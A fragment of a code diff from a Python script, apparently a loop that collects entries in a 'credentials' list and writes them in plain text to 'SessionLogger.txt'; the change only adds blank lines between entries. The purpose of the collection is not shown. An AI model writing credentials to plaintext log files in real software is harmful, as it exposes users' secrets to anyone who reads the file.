@@ -24,4 +24,4 @@ while True:
 
 with open("SessionLogger.txt", "w") as file:
     for entry in credentials:
-        file.write(str(entry) + "\n")
+        file.write(str(entry) + "\n\n")  # Added an extra \n for spacing between entries
